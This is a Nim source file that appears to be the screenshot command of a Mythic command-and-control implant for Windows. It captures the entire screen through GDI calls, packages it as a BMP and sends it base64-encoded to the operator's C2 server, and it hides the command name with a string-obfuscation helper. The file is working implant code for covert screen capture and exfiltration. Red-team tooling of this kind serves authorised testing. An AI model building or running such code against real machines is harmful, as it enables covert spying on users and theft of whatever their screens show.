## screenshot — Capture the screen via GDI BitBlt and send to Mythic (Windows only).
## Builds a 32-bit BMP in memory, then delivers it through the standard Mythic
## download protocol with is_screenshot=true so it appears in the Screenshots tab.
import std/[json, base64]
import core/types
import commands/registry
import crypto/strenc

when defined(windows):
  type
    HANDLE  = int
    HDC     = HANDLE
    HBITMAP = HANDLE
    HGDIOBJ = HANDLE
    DWORD   = uint32
    WORD    = uint16
    LONG    = int32
    BOOL    = int32
    UINT    = uint32
    LPVOID  = pointer

  const
    SRCCOPY        = DWORD(0x00CC0020)
    SM_CXSCREEN    = int32(0)
    SM_CYSCREEN    = int32(1)
    DIB_RGB_COLORS = UINT(0)

  type
    BITMAPINFOHEADER {.pure.} = object
      biSize:          DWORD
      biWidth:         LONG
      biHeight:        LONG
      biPlanes:        WORD
      biBitCount:      WORD
      biCompression:   DWORD
      biSizeImage:     DWORD
      biXPelsPerMeter: LONG
      biYPelsPerMeter: LONG
      biClrUsed:       DWORD
      biClrImportant:  DWORD

    BITMAPINFO {.pure.} = object
      bmiHeader: BITMAPINFOHEADER

  proc GetDC(hWnd: HANDLE): HDC
    {.importc: "GetDC", dynlib: "user32".}
  proc ReleaseDC(hWnd: HANDLE, hDC: HDC): int32
    {.importc: "ReleaseDC", dynlib: "user32".}
  proc GetSystemMetrics(nIndex: int32): int32
    {.importc: "GetSystemMetrics", dynlib: "user32".}
  proc CreateCompatibleDC(hDC: HDC): HDC
    {.importc: "CreateCompatibleDC", dynlib: "gdi32".}
  proc CreateCompatibleBitmap(hDC: HDC, nWidth: int32, nHeight: int32): HBITMAP
    {.importc: "CreateCompatibleBitmap", dynlib: "gdi32".}
  proc SelectObject(hDC: HDC, hGdiObj: HGDIOBJ): HGDIOBJ
    {.importc: "SelectObject", dynlib: "gdi32".}
  proc BitBlt(hdcDst: HDC, x: int32, y: int32, cx: int32, cy: int32,
              hdcSrc: HDC, x1: int32, y1: int32, rop: DWORD): BOOL
    {.importc: "BitBlt", dynlib: "gdi32".}
  proc GetDIBits(hdc: HDC, hbm: HBITMAP, start: UINT, cLines: UINT,
                 lpvBits: LPVOID, lpbmi: ptr BITMAPINFO, usage: UINT): int32
    {.importc: "GetDIBits", dynlib: "gdi32".}
  proc DeleteObject(ho: HGDIOBJ): BOOL
    {.importc: "DeleteObject", dynlib: "gdi32".}
  proc DeleteDC(hdc: HDC): BOOL
    {.importc: "DeleteDC", dynlib: "gdi32".}

  # ---------------------------------------------------------------------------

  proc le32(buf: var seq[byte], off: int, v: uint32) =
    buf[off]   = byte(v          and 0xFF)
    buf[off+1] = byte((v shr  8) and 0xFF)
    buf[off+2] = byte((v shr 16) and 0xFF)
    buf[off+3] = byte((v shr 24) and 0xFF)

  proc le16(buf: var seq[byte], off: int, v: uint16) =
    buf[off]   = byte(v         and 0xFF)
    buf[off+1] = byte((v shr 8) and 0xFF)

  proc captureScreenBmp(): seq[byte] =
    let hDC   = GetDC(0)
    let w     = GetSystemMetrics(SM_CXSCREEN)
    let h     = GetSystemMetrics(SM_CYSCREEN)
    let memDC = CreateCompatibleDC(hDC)
    let hBmp  = CreateCompatibleBitmap(hDC, w, h)
    let old   = SelectObject(memDC, hBmp)
    discard BitBlt(memDC, 0, 0, w, h, hDC, 0, 0, SRCCOPY)

    let pixSize = int(w) * int(h) * 4   # 32-bit BGRA

    var bmi: BITMAPINFO
    bmi.bmiHeader.biSize      = DWORD(sizeof(BITMAPINFOHEADER))
    bmi.bmiHeader.biWidth     = LONG(w)
    bmi.bmiHeader.biHeight    = LONG(h)  # positive = bottom-up (standard BMP)
    bmi.bmiHeader.biPlanes    = WORD(1)
    bmi.bmiHeader.biBitCount  = WORD(32)
    bmi.bmiHeader.biSizeImage = DWORD(pixSize)

    var pixels = newSeq[byte](pixSize)
    discard GetDIBits(memDC, hBmp, UINT(0), UINT(h),
                      addr pixels[0], addr bmi, DIB_RGB_COLORS)

    discard SelectObject(memDC, old)
    discard DeleteObject(hBmp)
    discard DeleteDC(memDC)
    discard ReleaseDC(0, hDC)

    # Build BMP file in memory (BITMAPFILEHEADER=14 + BITMAPINFOHEADER=40 + pixels)
    let fileSize = 54 + pixSize
    var buf = newSeq[byte](fileSize)  # zero-initialised

    buf[0] = 0x42; buf[1] = 0x4D        # 'BM'
    le32(buf,  2, uint32(fileSize))      # bfSize
    le32(buf, 10, 54u32)                 # bfOffBits (reserved bytes stay 0)

    le32(buf, 14, 40u32)                 # biSize
    le32(buf, 18, uint32(w))             # biWidth
    le32(buf, 22, uint32(h))             # biHeight
    le16(buf, 26, 1u16)                  # biPlanes
    le16(buf, 28, 32u16)                 # biBitCount
    le32(buf, 34, uint32(pixSize))       # biSizeImage (biCompression stays 0=BI_RGB)

    copyMem(addr buf[54], addr pixels[0], pixSize)
    return buf

# ---------------------------------------------------------------------------

proc screenshotExecute(taskId: string, params: JsonNode, state: AgentState,
                       send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: "screenshot is Windows-only", status: "error",
                      completed: true)
  else:
    let bmpData = captureScreenBmp()
    if bmpData.len == 0:
      return TaskResult(output: "Error: screen capture returned no data",
                        status: "error", completed: true)

    # Convert seq[byte] → string for base64 encoding
    var bmpStr = newString(bmpData.len)
    copyMem(addr bmpStr[0], unsafeAddr bmpData[0], bmpData.len)
    let chunkB64 = encode(bmpStr)

    let msg = %*{
      "action": "post_response",
      "responses": [%*{
        "task_id": taskId,
        "download": {
          "total_chunks":  1,
          "chunk_num":     1,
          "chunk_data":    chunkB64,
          "full_path":     "screenshot.bmp",
          "is_screenshot": true,
        },
      }],
    }
    discard send(msg)

    return TaskResult(
      output:    "Screenshot captured (" & $(bmpData.len div 1024) & " KB, " &
                 $((bmpData.len - 54) div 4 div 1) & " px total)",
      status:    "success",
      completed: true,
    )

proc initScreenshot*() =
  register(hidstr("screenshot"), screenshotExecute)
